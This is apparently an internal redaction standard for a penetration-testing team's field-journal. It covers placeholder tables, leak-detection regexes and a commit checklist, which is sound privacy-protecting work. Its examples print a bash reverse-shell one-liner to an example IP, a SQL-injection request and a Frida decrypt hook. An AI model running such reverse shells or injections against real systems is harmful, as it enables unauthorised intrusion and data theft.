# Field-Journal Redaction Rules

> **You must redact** field-journal entries, PR submissions, shared payloads, and public reports. This placeholder standard draws on the PentAGI multi-agent anonymization protocol. Its goal is to **keep reusable value without exposing real targets**.

## Placeholder table

### Network and hosts

| Type | Placeholder | Use case |
|------|-------|---------|
| Target IP | `{target_ip}` | Penetration-testing target host |
| Victim IP | `{victim_ip}` | Next hop during internal-network lateral movement |
| Remote host | `{remote_host}` | General remote address |
| Server IP | `{server_ip}` | C2 / relay / public callback |
| Callback domain | `{callback_domain}` | OOB / reverse connection |
| Target domain | `{target_domain}` | Web / email target |
| Victim domain | `{victim_domain}` | Internal-network domain |
| Custom port | `{port}` | Non-standard port |
| Standard port | Keep the original value | Keep 80 / 443 / 22 / 445 / 3389 and similar values for reuse |

### Credentials and keys

| Type | Placeholder |
|------|-------|
| Username | `{username}` |
| Password | `{password}` |
| Hash | `{hash}` |
| Session token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer token | `{bearer_token}` |

### URLs and endpoints

| Type | Placeholder |
|------|-------|
| General URL | `{url}` |
| API endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload endpoint | `{upload_endpoint}` |
| Login endpoint | `{login_endpoint}` |

### Paths

| Type | Placeholder |
|------|-------|
| Installation directory | `{install_dir}` |
| Configuration file | `{config_path}` |
| Web root | `{webroot}` |
| Upload directory | `{upload_dir}` |
| Log path | `{log_path}` |

### Business identifiers

| Type | Placeholder |
|------|-------|
| Real name | `{user_name}` |
| Email | `{user_email}` |
| Phone number | `{phone}` |
| Employee ID | `{employee_id}` |
| Order number | `{order_id}` |
| UUID | `{uuid}` |
## Do not redact

To keep the experience reusable, **do not replace** the following content:

- CVE numbers (`CVE-2024-1234`)
- Tool names and versions (`sqlmap 1.7.10`)
- Standard ports (80 / 443 / 445 / 1433 / 3306 and similar)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- General payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)

## Preserve context

When replacing values, preserve the semantic structure so readers can identify the content:

```python
# ❌ Replace everything with X. The meaning is lost.
target = "X"
url = "X/X"

# ❌ Use a placeholder that is too general.
target = "{target}"
url = "{url}"

# ✅ Preserve context.
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload redaction

### Web payload

```
Original: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
      Host: shop.victim-corp.cn
      Cookie: PHPSESSID=abcdef123456

Redacted: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
      Host: {target_domain}
      Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# Original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# Redacted
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook script

```javascript
// Original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// Redacted
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

## Binary sample redaction

### Hashes

Recording the sha256 is enough. **Do not attach the original file**. If you must share a sample:

- Upload it to the public VirusTotal or MalwareBazaar sample library.
- Link to a sample with the same hash that someone else has analyzed.

### Strings and symbols

```c
// Original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// Redacted
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Screenshot redaction

- Use a mosaic or solid black overlay to cover usernames, email addresses, phone numbers, order numbers, and names.
- Show only the domain structure in the URL bar. Keep the path and cover the host, or replace the whole URL.
- Keep the first two octets of internal IP ranges: `10.0.x.x` instead of `10.0.10.50`.
- Cover image elements that identify the company, such as logos and watermarks.

## CTF case exception

CTF problem statements, target hostnames, and flag formats are **usually not sensitive** because the targets are public. However:

- Treat a privately deployed lab as a real environment.
- Do not publish a flag before the competition ends.
- Do not copy an unpublished solution directly into field-journal.

## Automatic detection script

After writing a field-journal entry, run the following regular expressions to find missed redactions:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# Public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# Email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# Mainland China mobile number
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux equivalent
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

The checks are packaged in `skills/scripts/scan-leaks.ps1` (PowerShell, compatible with PS 5.1 and pwsh). Run it before each commit:
```powershell
powershell -File skills/scripts/scan-leaks.ps1 -Path skills/field-journal
```
CI (`ci.yml` `leak-scan` job) runs this script. It fails when it finds unredacted information.

## Reverse: read another person's redacted document

When you read another person's field-journal or writeup and see a placeholder such as `{target_ip}`, **do not replace it with a real value from your environment before committing**. Keep the placeholder unchanged.

## Field-Journal required checklist

Before committing a field-journal entry, check it against this checklist:

```
□ No public IPs (except CDNs and public services)
□ No real domains (except example.com and similar example domains)
□ No real credentials, tokens, or hashes (replace them with `{placeholder}`)
□ No names, employee IDs, or email addresses exposed in screenshots
□ No sample file itself (keep only the sha256)
□ Replace every JWT, OAuth code, and API key
□ Blur internal IP ranges to the first two octets (`10.0.x.x`)
□ Replace target parameters in payloads with general placeholders
□ Replace Cookies and session IDs
```

Append this checklist directly to the end of `field-journal/_template.md`.
